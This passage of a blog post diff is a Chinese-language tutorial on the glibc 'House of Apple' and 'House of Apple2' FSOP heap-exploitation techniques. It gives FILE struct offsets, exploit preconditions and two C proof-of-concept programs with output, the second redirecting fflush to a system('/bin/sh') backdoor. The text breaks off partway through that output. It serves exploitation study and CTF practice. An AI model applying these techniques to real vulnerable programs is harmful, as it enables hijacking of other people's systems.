@@ -156,6 +156,187 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Apple-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-08 23:41:08" itemprop="dateCreated datePublished" datetime="2022-11-08T23:41:08+08:00">2022-11-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-11-10 02:28:59" itemprop="dateModified" datetime="2022-11-10T02:28:59+08:00">2022-11-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Apple"><a href="#House-Of-Apple" class="headerlink" title="House Of Apple"></a>House Of Apple</h2><p>House Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用</p>
+<p>此方法利用成功的前提是已经泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </p>
+<hr>
+<h2 id="House-Of-Apple-原理"><a href="#House-Of-Apple-原理" class="headerlink" title="House Of Apple 原理"></a>House Of Apple 原理</h2><p>当程序从 <code>main</code> 函数返回或者执行 <code>exit</code> 函数的时候，均会调用 <code>fcloseall</code> 函数，该调用链为： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wstrn_overflow</span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后会遍历 <code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
+<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数</li>
+</ul>
+<p>使用 largebin attack 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的 <code>IO_FILE</code> 结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值</p>
+<p>要想修改其他地方的值，就离不开 <code>_IO_FILE</code> 的一个成员 <code>_wide_data</code> 的利用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>我们在伪造 <code>_IO_FILE</code> 结构体的时候，伪造 <code>_wide_data</code> 变量，然后通过某些函数，比如 <code>_IO_wstrn_overflow</code> 就可以将已知地址空间上的某些值修改为一个已知值</p>
+<h2 id="House-Of-Apple-利用姿势"><a href="#House-Of-Apple-利用姿势" class="headerlink" title="House Of Apple 利用姿势"></a>House Of Apple 利用姿势</h2><p>使用 house of apple 的条件为：</p>
+<ul>
+<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数</li>
+<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
+<li>能使用一次 largebin attack（一次即可） </li>
+</ul>
+<p>先利用 largebin attack 劫持 <code>_IO_list_all</code>，然后伪造一个 <code>stderr IO_FILE</code>：</p>
+<ul>
+<li>stderr+0x28 = -1（stderr-&gt;_IO_write_ptr）</li>
+<li>stderr+0x74 = 8（stderr-&gt;_flags2）</li>
+<li>stderr+0xa0 = target（stderr-&gt;_wide_data）</li>
+<li>stderr+0xd8 == _IO_wstrn_jumps（stderr-&gt;vtable）</li>
+</ul>
+<p>最后调用 exit 完成修改（因为 <code>stderr IO_FILE</code> 被伪造，因此程序不会真的退出）</p>
+<p>使用案例如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="keyword">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">stderr</span> = puts_addr + <span class="number">0x1691a0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> stderr_write_ptr_addr = <span class="built_in">stderr</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_flags2_addr = <span class="built_in">stderr</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_wide_data_addr = <span class="built_in">stderr</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="keyword">size_t</span> sdterr_vtable_addr = <span class="built_in">stderr</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="keyword">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = <span class="built_in">stderr</span> - <span class="number">0x4960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_write_ptr_addr = (<span class="keyword">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_wide_data_addr = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)sdterr_vtable_addr = (<span class="keyword">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f6c95c1c420</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f6c95d855e8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f6c95d85634</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f6c95d85660</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f6c95d85698</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f6c95d80c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall <span class="keyword">and</span> trigger house of apple</span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br></pre></td></tr></table></figure>
+<ul>
+<li>成功对堆上的数据进行了修改</li>
+</ul>
+<p>上面这种用法只能实现已知地址任意写（和 largebin attack 的效果类似），下面这种利用方式可以直接劫持程序流程（称为 house of apple2）</p>
+<h2 id="House-Of-Apple2-原理"><a href="#House-Of-Apple2-原理" class="headerlink" title="House Of Apple2 原理"></a>House Of Apple2 原理</h2><p><code>stdin/stdout/stderr</code> 这三个 <code>_IO_FILE</code> 结构体会以 <code>_IO_file_jumps</code> 为虚表，而其中的函数 <code>IO_validate_vtable</code> 负责检查 <code>vtable</code> 的合法性</p>
+<p>但在调用虚表 <code>_wide_vtable</code> 里面的函数时，并没有检查 <code>vtable</code> 的合法性</p>
+<p>因此，我们可以劫持 <code>IO_FILE</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制 <code>_wide_data</code> 为可控的堆地址空间，进而控制 <code>_wide_data-&gt;_wide_vtable</code> 为可控的堆地址空间，然后控制程序的执行流：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode -&gt; backdoor</span><br></pre></td></tr></table></figure>
+<h2 id="House-Of-Apple2-利用姿势"><a href="#House-Of-Apple2-利用姿势" class="headerlink" title="House Of Apple2 利用姿势"></a>House Of Apple2 利用姿势</h2><p>使用 house of apple2 的条件为：</p>
+<ul>
+<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
+<li>能控制程序执行<code>IO</code>操作：<ul>
+<li>从 <code>main</code> 函数返回</li>
+<li>调用 <code>exit</code> 函数</li>
+<li>通过 <code>__malloc_assert</code> 触发</li>
+</ul>
+</li>
+<li>能控制 <code>_IO_FILE</code> 的 <code>vtable</code> 和 <code>_wide_data</code>（一般使用 <code>largebin attack</code>去控制）</li>
+</ul>
+<p>使用案例如下：（使用 <code>_IO_wdefault_xsgetn</code> 调用链）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="keyword">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *stderr2 = (<span class="keyword">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="keyword">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="keyword">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="keyword">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7fe29386f420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7fe2937eb000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7fe2939d85c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7fe2939d3c60</span></span><br><span class="line">[+] step <span 